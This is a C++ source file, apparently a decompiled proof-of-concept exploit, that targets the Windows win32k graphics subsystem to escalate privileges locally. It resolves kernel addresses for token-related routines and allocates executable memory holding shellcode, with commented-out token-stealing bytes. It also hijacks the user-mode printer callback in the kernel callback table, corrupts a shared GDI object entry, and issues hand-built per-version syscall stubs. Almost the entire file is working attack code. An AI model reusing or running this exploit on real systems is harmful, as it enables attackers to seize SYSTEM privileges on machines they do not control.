// 0005Poc.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <ntstatus.h>
#pragma warning(disable: 4996)     
#define _WORD WORD
#define _DWORD DWORD
#define _QWORD ULONG64
#define _BYTE BYTE



char *g_fourByte = "\x41\x5c\x5f\xc3\x0";
NTGDIENGUNLOCKSURFACE g_pNtGdiEngUnLockSurface = NULL;
NTGDIENGBITBLT g_pNtGdiEngBitBlt = NULL;
NTGDIENGLOCKSURFACE g_pNtGdiEngLockSurface = NULL;
NTGDIENGCREATEBITMAP g_pNtGdiEngCreateBitmap = NULL;
NTGDIBRUSHOBJ_PVALLOCRBRUSH g_pNtGdiBRUSHOBJ_pvAllocRbrush = NULL;
NTGDIENGCREATEDEVICESURFACE g_pNtGdiEngCreateDeviceSurface = NULL;
NTGDIENGDELETESURFACE g_pNtGdiEngDeleteSurface = NULL;
NTGDIDELETEOBJECTAPP g_pNtGdiDeleteObjectApp = NULL;
NTGDIENGASSOCIATESURFACE g_pNtGdiEngAssociateSurface = NULL;
NTGDIENGASSOCIATESURFACE g_pNtGdiEngAssociateSurface_2 = NULL;
NTGDIENDDOC g_pNtGdiEndDoc = NULL;
NTGDIBITBLT g_pNtGdiBitBlt = NULL;
NTGDISTARTDOC g_pNtGdiStartDoc = NULL;
NTQUERYSYSTEMINFOMATION g_pNtQuerySystemInformation = NULL;
PSREFERENCEPRIMARYTOKEN g_pPsReferencePrimaryToken = NULL;
IOTHREADTOPROCESS g_pIoThreadToProcess = NULL;
NTALLOCATEVIRUALMEMORY g_pNtAllocateVirtualMemory = NULL;
NTFREEVIRTUALMEMORY g_pNtFreeVirtualMemory = NULL;
RTLINITUNICODESTRING g_pRtlInitUnicodeString = NULL;
NTCALLBACKRETURN g_pNtCallbackReturn = NULL;
NTGDIDRAWSTREAM g_pNtGdiDrawStream = NULL;
NTGDIOPENDCW g_pNtGdiOpenDCW = 0;

ULONG64 g_pPsInitialSystemProcess = 0;
HGDIOBJ ho;
_QWORD qword_140011490 = 0;
BYTE unk_140011760[0x1000];
BYTE unk_140011650[0x100];
DWORD unk_140012760[0x1000];
DWORD dword_1400114A0 = 0;
DWORD dword_1400114A4 = 0;
HSURF g_hSURF_140011648 = 0;
HDEV g_hDEV_140011750 = 0;
DWORD dword_14001149C = 0;
DWORD dword_1400114A8 = 0;
DWORD unk_140010340[2] = {1, 2};
DWORD dword_140010310[12] = { 0, 0, 0x59, 0x5D, 0x5D, 0x5D, 0x5E, 0x5E, 0x67, 0x67, 0x67, 0x67 };
HBITMAP g_hBitMap = 0;
HBRUSH g_hBrush = 0;
ULONG64 g_GdiFunTab[14];
WORD g_wServicePackMajor = 0;
WORD g_wServicePackMinor = 0;
DWORD g_dwMinorVersion = 0;
DWORD g_MinorVersion = 0;
ULONG64 g_AllocBuffer = NULL;
VERSION28h g_VersionInfo = {6, 1, 1, 9, 2, 2};
PVERSION28h g_pVersionInfo = &g_VersionInfo;
HANDLE g_hHeap = 0;
ULONG64 ulRegionSize = 0;
BYTE g_bShellCode[0x1000] = { 0xcc, 0xcc, 0xcc};

int main()
{
    UNICODE_STRING v33;
    HANDLE hProc = 0;
    HMODULE hModNtdll = 0;
    HMODULE hModGdi = 0;
    HWND hWnd = 0;
    ULONG64 BaseAddr = 0;
    DWORD v18 = 0;
    DWORD dwCallBackTableIndex = 0;
    DEVMODEW devMode;
    ULONG64 UMdhpdev[24] = { 0 };
    ULONG64 UMdhpdev1[24] = { 0 };
    DOCINFOW docInfo;

    printf("sub_140001A00 %p\r\n", sub_140001A00);
    printf("sub_140001AE0 %p\r\n", sub_140001AE0);
    printf("sub_140001C70 %p\r\n", sub_140001C70);

    UMdhpdev[0] = 3;
    UMdhpdev[1] = (ULONG64)g_fourByte;
    UMdhpdev[2] = (ULONG64)g_fourByte;
    UMdhpdev[3] = (ULONG64)g_fourByte;
    UMdhpdev[4] = (ULONG64)g_fourByte;
    UMdhpdev[5] = (ULONG64)g_fourByte;

    memset(&v33, 0, sizeof(UNICODE_STRING));
    memset(&devMode, 0, sizeof(DEVMODEW));
    devMode.dmSize = sizeof(DEVMODEW);
    // win32k!NtGdiOpenDCW+0x19b
    LoadKrnlAndInitpfn();
    GetSysVersion();
    hProc = GetCurrentProcess();
    
    hModNtdll = LoadLibraryA("ntdll.dll");

    g_pNtAllocateVirtualMemory = (NTALLOCATEVIRUALMEMORY)selfGetProcAddr(hModNtdll, (ULONG64)"NtAllocateVirtualMemory");
    g_pNtFreeVirtualMemory = (NTFREEVIRTUALMEMORY)selfGetProcAddr(hModNtdll, (ULONG64)"NtFreeVirtualMemory");
    g_pRtlInitUnicodeString = (RTLINITUNICODESTRING)selfGetProcAddr(hModNtdll, (ULONG64)"RtlInitUnicodeString");
    g_pNtCallbackReturn = (NTCALLBACKRETURN)selfGetProcAddr(hModNtdll, (ULONG64)"NtCallbackReturn");

    FreeLibrary(hModNtdll);
    hModGdi = LoadLibraryA("gdi32.dll");
    FreeLibrary(hModGdi);

     g_pNtGdiDrawStream = (NTGDIDRAWSTREAM)selfGetProcAddr(hModGdi, (ULONG64)"GdiDrawStream");
    GetGdiFunc();
    DrawStream();
     
    g_pRtlInitUnicodeString(&v33, (PWSTR)g_fourByte);


    hWnd = CreateWindowExW(0, L"STATIC", L"h", WS_POPUP | WS_DISABLED, 0, 0, 0, 0, 0, 0, 0, 0);
    if (hWnd == 0) {
        return -1;
    }


    ulRegionSize = 0x3d;
    if ( g_pNtAllocateVirtualMemory(hProc, (PVOID*)&BaseAddr, 0, &ulRegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) >= 0) {
        g_AllocBuffer = BaseAddr;

        memcpy((VOID*)g_AllocBuffer, g_bShellCode, ulRegionSize);

        //*(ULONG64*)BaseAddr = 0x909000000020e9CC;
        //*(ULONG64 *)(BaseAddr + 8) = g_pPsInitialSystemProcess;// 写入shellcode
        //*(ULONG64 *)(BaseAddr + 16) = 0x250c909090909090;
        //*(ULONG64 *)(BaseAddr + 24) = 0x53e0b84800000188;
        //*(ULONG64 *)(BaseAddr + 32) = 0xb848fffff8039bcf;
        //*(ULONG64 *)(BaseAddr + 40) = 0x4242424241414141;
        //*(ULONG64 *)(BaseAddr + 48) = 0x5e5fa5f803c3d0ff;
        //*(_DWORD *)(BaseAddr + 56) = 0x5858595a;
        //*(_BYTE *)(BaseAddr + 60) = 0xc3;
    }
    v18 = g_pVersionInfo->wServicePackMinor;
    

    
    /*
    if (v18 == 2) {

    }
    else if(v18 > 7){

    }
    */

    dwCallBackTableIndex = 0x174;
    if (dwCallBackTableIndex) {
        PVOID *ppClientPrinterThunk = (PVOID*)GetKernelCallbackTable(dwCallBackTableIndex);
        ULONG64 pClientPrinterThunk = *(PULONG64)ppClientPrinterThunk;
        DWORD dwOldProtect = 0;
        DWORD dwNewProtect = PAGE_READWRITE;
        if (pClientPrinterThunk) {
            if (VirtualProtect(ppClientPrinterThunk, 8, dwNewProtect, &dwOldProtect)) {
                *(PULONG64)ppClientPrinterThunk = (ULONG64)&fake_ClientPrinterThunk;
                printf("ppClientPrinterThunk %p\r\n", ppClientPrinterThunk);
                VirtualProtect(ppClientPrinterThunk, 8, dwOldProtect, &dwNewProtect);
            }
        }
    }
    
    

    /*
    g_pVersionInfo->dw4
        
    */
    
    g_pNtGdiOpenDCW = (NTGDIOPENDCW)g_GdiFunTab[0];
    HDC hDC = g_pNtGdiOpenDCW(&v33, &devMode, 0L, 0L, 0L, hWnd, UMdhpdev, (ULONG64)UMdhpdev1);

    DestroyWindow(hWnd);

    if (hDC) {
        BOOL bBanding = FALSE;
        GetAndSetSharedGdiObj(hDC);
        g_pNtGdiStartDoc = (NTGDISTARTDOC)g_GdiFunTab[1];
        memset(&docInfo, 0, sizeof(DOCINFOW));
        docInfo.cbSize = sizeof(DOCINFOW);
        docInfo.lpszDocName = (LPCWSTR)g_fourByte;
        g_pNtGdiStartDoc(hDC, &docInfo, &bBanding, 5);

        g_pNtGdiBitBlt = (NTGDIBITBLT)g_GdiFunTab[8];
        g_pNtGdiBitBlt(hDC, 0, 0, 10, 10, hDC, 0, 0, 0xFB0A09, 0, 0);

        g_pNtGdiEndDoc = (NTGDIENDDOC)g_GdiFunTab[2];
        g_pNtGdiEndDoc(hDC);
        g_pNtGdiDeleteObjectApp = (NTGDIDELETEOBJECTAPP)g_GdiFunTab[3];
        g_pNtGdiDeleteObjectApp(hDC);

        ulRegionSize = 0;
        memset((VOID*)BaseAddr, 0, 0x40);
        g_pNtFreeVirtualMemory(hProc, (PVOID*)&BaseAddr, &ulRegionSize, 0x8000);
    }

    if (dwCallBackTableIndex) {


    }

    return 0;
}



int LoadKrnlAndInitpfn()
{
    HMODULE var;
    HMODULE hNtdll;
    PVOID ImageBase;
    HMODULE hKrnl;
    ULONG64 Baseoffset;
    CHAR szModKrnl[MAX_PATH];


    memset(&szModKrnl, 0, 0x104ui64);
    hNtdll = LoadLibraryA("ntdll.dll");

    if (hNtdll)
    {
        var = (HMODULE)GetProcAddress(hNtdll, "NtQuerySystemInformation");
        g_pNtQuerySystemInformation = (NTQUERYSYSTEMINFOMATION)var;
        if (g_pNtQuerySystemInformation)
        {
            ImageBase = GetSysModuleBase_Name((PCHAR)szModKrnl);
            if (ImageBase)
            {

                hKrnl = LoadLibraryExA(szModKrnl, 0i64, 1u);

                Baseoffset = (ULONG64)ImageBase - (ULONG64)hKrnl;
                g_pPsReferencePrimaryToken = (PSREFERENCEPRIMARYTOKEN)GetProcAddress(hKrnl, "PsReferencePrimaryToken");
                g_pPsReferencePrimaryToken = (PSREFERENCEPRIMARYTOKEN)((ULONG64)g_pPsReferencePrimaryToken + Baseoffset);
                g_pPsInitialSystemProcess = (ULONG64)GetProcAddress(hKrnl, "PsInitialSystemProcess");
                g_pPsInitialSystemProcess = (ULONG64)((ULONG64)g_pPsInitialSystemProcess + Baseoffset);
                g_pIoThreadToProcess = (IOTHREADTOPROCESS)GetProcAddress(hKrnl, "IoThreadToProcess");
                g_pIoThreadToProcess = (IOTHREADTOPROCESS)((ULONG64)g_pIoThreadToProcess + Baseoffset);
                return FreeLibrary(hNtdll);
            }

        }
    }
    return 0;
}

PVOID GetSysModuleBase_Name(PCHAR pszBuf) {
    
    RTL_PROCESS_MODULES procMod;
    ULONG64 ulRetBytes = 0;
    NTSTATUS status = 0;
    ULONG64 ulNumberOfModules = 0;
    PRTL_PROCESS_MODULE_INFORMATION pProcModInfo;
    PVOID ImageBase = 0;

    status = g_pNtQuerySystemInformation(11i64, &procMod, sizeof(RTL_PROCESS_MODULES), &ulRetBytes);

    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        
        PRTL_PROCESS_MODULES pProcMod = (PRTL_PROCESS_MODULES)LocalAlloc(LMEM_ZEROINIT, ulRetBytes);
        if (pProcMod) {
            status = g_pNtQuerySystemInformation(11i64, pProcMod, ulRetBytes, &ulRetBytes);
            if (status) {
                printf("NtQuerySystemInformation failed, status: %08X\n", (unsigned int)status);

            }
            else {
                ulNumberOfModules = pProcMod->NumberOfModules;
                pProcModInfo = procMod.Modules;

                for (ULONG i = 0; i < ulNumberOfModules; i++) {

                    if (strstr((char*)pProcModInfo->FullPathName, "ntoskrnl.exe") != 0) {
                        strcpy(pszBuf, "ntoskrnl.exe");
                        ImageBase = pProcModInfo->ImageBase;
                        break;
                    }
                    else if (strstr((char*)pProcModInfo->FullPathName, "ntkrnlpa.exe") != 0) {
                        strcpy(pszBuf, "ntkrnlpa.exe");
                        ImageBase = pProcModInfo->ImageBase;
                        break;
                    }
                }
                LocalFree(pProcMod);
            }
        }
        else {
            printf("NtQuerySystemInformation failed (second), code: %08X\n", GetLastError());
            ImageBase = 0i64;
        }

    }
    else {
        printf("NtQuerySystemInformation (first) failed, status: %08X\n", (unsigned int)status);
        ImageBase = 0;
    }


    return ImageBase;
}


signed __int64 GetSysVersion() { 
    OSVERSIONINFOEX verInfo;
    DWORD dwMajorVersion = 0;
    DWORD dwMinorVersion = 0;
    BOOL isGerVersionExWSuccess = FALSE;
    memset(&verInfo, 0, sizeof(OSVERSIONINFOEX));
    verInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    
    //////////////
    
    /////////////


    if (GetVersionEx((LPOSVERSIONINFO)&verInfo)) {
        dwMajorVersion = verInfo.dwMajorVersion;
        dwMinorVersion = verInfo.dwMinorVersion;
        g_wServicePackMajor = verInfo.wServicePackMajor;
        g_wServicePackMinor = verInfo.wServicePackMinor;
        isGerVersionExWSuccess = TRUE;
    }
    else {
        /*+

        */
    }
    
    g_dwMinorVersion = dwMinorVersion;

    if (dwMajorVersion == 4) {
        g_MinorVersion = 1;
        //g_VersionInfo.dw6 = 1;
    }


    return 1;
}


ULONG64 selfGetProcAddr(HMODULE hMODULE, unsigned __int64 a2)
{
    __int64 v2; // rax@1
    unsigned __int64 v3; // rbx@1
    HMODULE v4; // r11@1
    __int64 v5; // rsi@1
    int v6; // edi@1
    unsigned __int64 v7; // rbp@1
    char *v8; // rdx@1
    char *v9; // r10@1
    int v10; // er9@2
    char *v11; // rax@3
    unsigned __int64 v12; // r8@3
    int v13; // ecx@4
    int v14; // edx@4
    const CHAR *v15; // rbx@11
    char *v16; // rax@14
    HMODULE v17; // rax@15
    ULONG64 result; // eax@16
    char *v19; // [sp+20h] [bp-128h]@1
    __int64 v20; // [sp+28h] [bp-120h]@1
    char *v21; // [sp+30h] [bp-118h]@1
    CHAR String1; // [sp+40h] [bp-108h]@14
    char Dst; // [sp+41h] [bp-107h]@14
    CHAR v24; // [sp+B0h] [bp-98h]@14
    char v25; // [sp+B1h] [bp-97h]@14

    v2 = *((DWORD *)hMODULE + 0xF);
    v3 = a2;
    v4 = hMODULE;
    v5 = *(DWORD *)((char *)hMODULE + v2 + 136);
    v6 = *(DWORD *)((char *)hMODULE + v5 + 24);
    v7 = *(DWORD *)((char *)hMODULE + v5 + 16);
    v20 = *(DWORD *)((char *)hMODULE + v2 + 140);
    v8 = (char *)hMODULE + *(DWORD *)((char *)hMODULE + v5 + 28);
    v9 = (char *)hMODULE + *(DWORD *)((char *)hMODULE + v5 + 32);
    v21 = (char *)hMODULE + *(DWORD *)((char *)hMODULE + v5 + 36);
    v19 = (char *)hMODULE + *(DWORD *)((char *)hMODULE + v5 + 28);
    if (v3 & 0xFFFF0000 && (v10 = 0, v6 > 0))
    {
        while (1)
        {
            v11 = (char *)v4 + *(DWORD *)v9;
            v12 = v3 - (ULONG64)v11;
            do
            {
                v13 = (unsigned __int8)v11[v12];
                v14 = (unsigned __int8)*v11 - v13;
                if ((unsigned __int8)*v11 != v13)
                    break;
                ++v11;
            } while (v13);
            if (!v14)
                break;
            ++v10;
            v9 += 4;
            if (v10 >= v6)
            {
                v8 = v19;
                goto LABEL_9;
            }
        }
        v15 = (char *)v4 + *(DWORD *)&v19[4 * *(WORD *)&v21[2 * v10]];
    }
    else
    {
    LABEL_9:
        if (v3 < v7 || v3 > *(DWORD *)((char *)v4 + v5 + 20) + v7 - 1)
            return 0;
        v15 = (char *)v4 + *(ULONG64 *)&v8[8 * (v3 - v7)];
    }
    if (v15 >= (const CHAR *)v4 + v5
        && v15 <= (const CHAR *)v4 + v20 + v5
        && (String1 = 0,
            memset(&Dst, 0, 0x63ui64),
            v24 = 0,
            memset(&v25, 0, 0x63ui64),
            lstrcpyA(&String1, v15),
            (v16 = strchr(&String1, 46)) != 0i64)
        && (*v16 = 0, lstrcpyA(&v24, v16 + 1), lstrcatA(&String1, ".dll"), (v17 = LoadLibraryA(&String1)) != 0i64))
    {
        result = selfGetProcAddr(v17, (unsigned __int64)&v24);
    }
    else
    {
        result = (ULONG64)v15;
    }
    return result;
}



signed __int64 GetGdiFunc()
{
    HANDLE hHeap; // r9@1
    _WORD *v1; // rbx@3
    signed int v2; // esi@5
    int v3; // er15@5
    int v4; // ebp@5
    signed int v5; // er12@5
    int v6; // er13@5
    int v7; // er14@5
    signed int v8; // edi@5
    int v9; // eax@6
    int v10; // eax@6
    _WORD *v11; // rax@22
    _WORD *v12; // rax@27
    signed __int16 v13; // si@27
    _WORD *v14; // rax@32
    signed __int64 v15; // r12@32
    _WORD *v16; // rax@37
    _WORD *v17; // rax@42
    _WORD *v18; // rax@47
    __int64 v19; // r11@47
    _WORD *v20; // rax@52
    __int64 v21; // r11@52
    _WORD *v22; // rax@57
    __int64 v23; // r11@57
    _WORD *v24; // rax@62
    _WORD *v25; // rax@67
    _WORD *v26; // rax@72
    _WORD *v27; // rax@77
    _WORD *v28; // rax@82
    int v30; // [sp+20h] [bp-68h]@5
    int v31; // [sp+24h] [bp-64h]@5
    signed int v32; // [sp+28h] [bp-60h]@5
    int v33 = 0; // [sp+90h] [bp+8h]@0
    int v34; // [sp+98h] [bp+10h]@5
    int v35; // [sp+A0h] [bp+18h]@5
    int v36; // [sp+A8h] [bp+20h]@5

    hHeap = g_hHeap;
    if (!g_hHeap)
    {
        hHeap = HeapCreate(0x40000u, 0i64, 0i64);
        g_hHeap = hHeap;
    }
    v1 = 0i64;
    if (g_VersionInfo.dw6 == 1)
    {
        switch (g_VersionInfo.wServicePackMinor)
        {
        case 2:
            v2 = 0x10E1;
            v3 = 0x1241;
            v33 = 0x1247;
            v4 = 0x1075;
            v34 = 0x123F;
            v35 = 0;
            v5 = 0x1118;
            v6 = 0x107D;
            v7 = 4707;
            v8 = 4109;
            v36 = 4672;
            v30 = 4682;
            v31 = 4681;
            v32 = 4683;
            goto LABEL_21;
        case 3:
            v2 = 4329;
            v9 = g_VersionInfo.dw5 != 0;
            v5 = 4386;
            v8 = 4109;
            v6 = v9 + 4225;
            v33 = v9 + 4702;
            v36 = v9 + 4695;
            v34 = v9 + 4694;
            v35 = v9 + 4758;
            v4 = v9 + 4217;
            v3 = v9 + 4696;
            v7 = v9 + 4730;
            v30 = v9 + 4705;
            v31 = v9 + 4704;
            v10 = v9 + 4706;
            goto LABEL_20;
        case 4:
        case 5:
            v2 = 4328;
            v3 = 4693;
            v33 = 4699;
            v4 = 4218;
            v34 = 4691;
            v35 = 4755;
            v5 = 4385;
            v6 = 4226;
            v7 = 4727;
            v8 = 4109;
            v36 = 4692;
            v30 = 4702;
            v31 = 4701;
            v32 = 4703;
            goto LABEL_21;
        case 6:
        case 7:
            v2 = 4337;
            v3 = 4730;
            v33 = 4736;
            v4 = 4220;
            v34 = 4728;
            v35 = 4792;
            v5 = 4395;
            v6 = 4229;
            v7 = 4764;
            v8 = 4109;
            v36 = 4729;
            v30 = 4739;
            v31 = 4738;
            v32 = 4740;
            goto LABEL_21;
        case 8:
        case 9:
            v2 = 4339;
            v3 = 4762;
            v33 = 4768;
            v4 = 4221;
            v34 = 4760;
            v35 = 4824;
            v5 = 4396;
            v6 = 4230;
            v7 = 4796;
            v8 = 4110;
            v36 = 4761;
            v30 = 4771;
            v31 = 4770;
            v32 = 4772;
            goto LABEL_21;
        case 10:
        case 11:
            v2 = 4167;
            v3 = 4794;
            v4 = 4285;
            v34 = 4796;
            v33 = 4788;
            v5 = 4110;
            v6 = 4276;
            v35 = 4866;
            v8 = 4398;
            v7 = 4837;
            v36 = 4795;
            v30 = 4785;
            v31 = 4786;
            v32 = 4784;
            goto LABEL_21;
        default:
            break;
        }
    }
    else
    {
        if (g_VersionInfo.dw6 != 2)
            return 0xFFFFFFFFi64;
        switch (g_VersionInfo.wServicePackMinor)
        {
        case 1:
        case 2:
            v5 = v33;
            v6 = v33;
            v4 = v33;
            v3 = v33;
            v34 = v33;
            v36 = v33;
            v2 = 0;
            v31 = v33;
            v35 = v33;
            v30 = v33;
            goto LABEL_19;
        case 3:
        case 4:
        case 5:
            v2 = 4318;
            v4 = 4130;
            v5 = 4628;
            v6 = 4490;
            v33 = 4506;
            v34 = 4493;
            v3 = 4501;
            v8 = 4104;
            v7 = 4402;
            v35 = 4622;
            v36 = 4498;
            v30 = 4511;
            v31 = 4521;
            v32 = 4494;
            goto LABEL_21;
        case 6:
        case 7:
            v2 = 4319;
            v4 = 4131;
            v6 = 4559;
            v5 = 4707;
            v33 = 4575;
            v3 = 4570;
            v8 = 4104;
            v7 = 4403;
            v34 = 4562;
            v35 = 4701;
            v36 = 4567;
            v30 = 4580;
            v31 = 4590;
            v32 = 4563;
            goto LABEL_21;
        case 8:
        case 9:
            v2 = 4314;
            v4 = 4131;
            v6 = 4565;
            v5 = 4720;
            v33 = 4582;
            v34 = 4569;
            v3 = 4577;
            v8 = 4104;
            v7 = 4394;
            v35 = 4713;
            v36 = 4574;
            v30 = 4587;
            v31 = 4597;
            v32 = 4570;
            goto LABEL_21;
        case 10:
        case 11:
            v2 = 4314;
            v4 = 4132;
            v6 = 4642;
            v5 = 4797;
            v33 = 0x1233;
            v34 = 4646;
            v3 = 4654;
            v8 = 4105;
            v7 = 4439;
            v35 = 4790;
            v36 = 4651;
            v30 = 4664;
            v31 = 4674;
            v32 = 4647;
            goto LABEL_21;
        default:
            break;
        }
    }
    v2 = v33;
    v5 = v33;
    v6 = v33;
    v4 = v33;
    v3 = v33;
    v35 = v33;
    v34 = v33;
    v36 = v33;
    v30 = v33;
    v31 = v33;
LABEL_19:
    v10 = v33;
    v7 = v33;
    v8 = v33;
LABEL_20:
    v32 = v10;
LABEL_21:
    if (hHeap)
    {
        v11 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);         // NtGdiOpenDCW
        hHeap = g_hHeap;
        *(_QWORD *)v11 = 0xB8D18B4Ci64;
        v11[4] = 0x50F;
        *((_BYTE *)v11 + 10) = 0xC3u;
    }
    else
    {
        v11 = 0i64;
    }
    if (v2)
        *((_DWORD *)v11 + 1) = v2;
    g_GdiFunTab[0] = (__int64)v11;
    if (hHeap)
    {
        v12 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        v13 = 0x50F;
        hHeap = g_hHeap;
        *(_QWORD *)v12 = 0xB8D18B4Ci64;
        v12[4] = 0x50F;
        *((_BYTE *)v12 + 10) = -61;
    }
    else
    {
        v13 = 0x50F;
        v12 = 0i64;
    }
    if (v5)
        *((_DWORD *)v12 + 1) = v5;
    g_GdiFunTab[1] = (__int64)v12;
    if (hHeap)
    {
        v14 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        v15 = 0xB8D18B4Ci64;
        hHeap = g_hHeap;
        *(_QWORD *)v14 = 0xB8D18B4Ci64;
        v14[4] = v13;
        *((_BYTE *)v14 + 10) = -61;
    }
    else
    {
        v15 = 0xB8D18B4Ci64;
        v14 = 0i64;
    }
    if (v6)
        *((_DWORD *)v14 + 1) = v6;
    g_GdiFunTab[2] = (__int64)v14;
    if (hHeap)
    {
        v16 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v16 = v15;
        v16[4] = v13;
        *((_BYTE *)v16 + 10) = -61;
    }
    else
    {
        v16 = 0i64;
    }
    if (v4)
        *((_DWORD *)v16 + 1) = v4;
    g_GdiFunTab[3] = (__int64)v16;
    if (hHeap)
    {
        v17 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v17 = v15;
        v17[4] = v13;
        *((_BYTE *)v17 + 10) = -61;
    }
    else
    {
        v17 = 0i64;
    }
    if (v3)
        *((_DWORD *)v17 + 1) = v3;
    g_GdiFunTab[4] = (__int64)v17;
    if (hHeap)
    {
        v18 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v18 = v15;
        v18[4] = v13;
        *((_BYTE *)v18 + 10) = -61;
        v19 = (__int64)v18;
    }
    else
    {
        v19 = 0i64;
    }
    if (v33)
        *(_DWORD *)(v19 + 4) = v33;
    g_GdiFunTab[5] = v19;
    if (hHeap)
    {
        v20 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v20 = v15;
        v20[4] = v13;
        *((_BYTE *)v20 + 10) = -61;
        v21 = (__int64)v20;
    }
    else
    {
        v21 = 0i64;
    }
    if (v34)
        *(_DWORD *)(v21 + 4) = v34;
    g_GdiFunTab[6] = v21;
    if (hHeap)
    {
        v22 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v22 = v15;
        v22[4] = v13;
        *((_BYTE *)v22 + 10) = -61;
        v23 = (__int64)v22;
    }
    else
    {
        v23 = 0i64;
    }
    if (v35)
        *(_DWORD *)(v23 + 4) = v35;
    g_GdiFunTab[7] = v23;
    if (hHeap)
    {
        v24 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v24 = v15;
        v24[4] = v13;
        *((_BYTE *)v24 + 10) = -61;
    }
    else
    {
        v24 = 0i64;
    }
    if (v8)
        *((_DWORD *)v24 + 1) = v8;
    g_GdiFunTab[8] = (__int64)v24;
    if (hHeap)
    {
        v25 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v25 = v15;
        v25[4] = v13;
        *((_BYTE *)v25 + 10) = -61;
    }
    else
    {
        v25 = 0i64;
    }
    if (v7)
        *((_DWORD *)v25 + 1) = v7;
    g_GdiFunTab[9] = (__int64)v25;
    if (hHeap)
    {
        v26 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v26 = v15;
        v26[4] = v13;
        *((_BYTE *)v26 + 10) = -61;
    }
    else
    {
        v26 = 0i64;
    }
    if (v36)
        *((_DWORD *)v26 + 1) = v36;
    g_GdiFunTab[10] = (__int64)v26;
    if (hHeap)
    {
        v27 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v27 = v15;
        v27[4] = v13;
        *((_BYTE *)v27 + 10) = -61;
    }
    else
    {
        v27 = 0i64;
    }
    if (v30)
        *((_DWORD *)v27 + 1) = v30;
    g_GdiFunTab[11] = (__int64)v27;
    if (hHeap)
    {
        v28 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        hHeap = g_hHeap;
        *(_QWORD *)v28 = v15;
        v28[4] = v13;
        *((_BYTE *)v28 + 10) = -61;
    }
    else
    {
        v28 = 0i64;
    }
    if (v31)
        *((_DWORD *)v28 + 1) = v31;
    g_GdiFunTab[12] = (__int64)v28;
    if (hHeap)
    {
        v1 = (WORD*)HeapAlloc(hHeap, 0, 0xBui64);
        *(_QWORD *)v1 = v15;
        v1[4] = v13;
        *((_BYTE *)v1 + 10) = -61;
    }
    if (v32)
        *((_DWORD *)v1 + 1) = v32;
    g_GdiFunTab[13] = (__int64)v1;
    return 0i64;
}



__int64 DrawStream() {
    HDC hDC = 0;
    HDC hCompDC = 0;
    HBITMAP hBitmap1 = 0;
    HBITMAP hBitmap2 = 0;
    DWORD dwBuf[24];

    memset(dwBuf, 0, sizeof(dwBuf));
    hDC = CreateDCW(L"DISPLAY", NULL, NULL, NULL);

    if (hDC) {
        hCompDC = CreateCompatibleDC(hDC);
        if (hCompDC) {
            hBitmap1 = CreateCompatibleBitmap(hDC, 0x64, 0x64);
            hBitmap2 = CreateCompatibleBitmap(hDC, 0x64, 0x64);

            if (hBitmap1 != 0 && hBitmap2 != 0) {
                if (SelectObject(hCompDC, hBitmap1) != 0 && SelectObject(hCompDC, hBitmap2) != 0) {
                    dwBuf[0] = 0x44727753;
                    dwBuf[2] = (DWORD)hCompDC;
                    dwBuf[3] = 0xA;
                    dwBuf[4] = 0xA;
                    dwBuf[5] = 0x32;
                    dwBuf[6] = 0x32;
                    dwBuf[7] = 1;
                    dwBuf[8] = (DWORD)hBitmap1;
                    dwBuf[9] = 9;
                    dwBuf[10] = 0xA;
                    dwBuf[11] = 0xA;
                    dwBuf[12] = 0x32;
                    dwBuf[13] = 0x32;
                    dwBuf[14] = 0xA;
                    dwBuf[15] = 0xA;
                    dwBuf[16] = 0x32;
                    dwBuf[17] = 0x32;
                    dwBuf[18] = 1;

                    g_pNtGdiDrawStream(hCompDC, 0x60, (ULONG64)&dwBuf);
                }
                DeleteObject(hBitmap1);
                DeleteObject(hBitmap2);
            }
            DeleteObject(hCompDC);
        }
        DeleteObject(hDC);
    }


    return 0;
}



DWORD GetAndSetSharedGdiObj(HDC hDC) {

    HBITMAP hBM = CreateBitmap(10, 10, 2u, 8u, selfGetProcAddr);
    g_hBitMap = hBM;
    if (!hBM) {
        return 0;
    }

    HBRUSH hBrush = CreatePatternBrush(hBM);
    g_hBrush = hBrush;
    if (!hBrush) {
        if (hBM) {
            DeleteObject(hBM);
        }
        goto END;
    }

    if (hDC) {
        ULONG64 pUserAddress = *(ULONG64*)(*(ULONG64*)(GetPEB() + 0xF8) + ((ULONG64)hDC & 0xffff) * sizeof(_GDI_CELL) + 0x10);

        *(ULONG64 *)(pUserAddress + 8) |= 0x1000;
        *(HBRUSH *)(pUserAddress + 0x10) = g_hBrush;

        return 0;
    }


    if (g_hBitMap) {
        DeleteObject(g_hBitMap);
    }

    if (g_hBrush) {
        DeleteObject(g_hBrush);
    }
    

END:
    g_hBitMap = 0;
    g_hBrush = 0;
    return 0;
}


ULONG64 fake_ClientPrinterThunk(HUMPD hUMPD) {

    ULONG64 OutputBuf = 0;
    DWORD dwOutputBufSize = 0;
    DWORD dwCallBackRetVal = 0;
    dwCallBackRetVal = fakeGdiPrinterThunk(hUMPD, &OutputBuf, &dwOutputBufSize);
    
    if (g_pNtCallbackReturn) {
        return g_pNtCallbackReturn((PVOID)OutputBuf, dwOutputBufSize, dwCallBackRetVal);
    }
    else {
        return 0;
    }
    
}


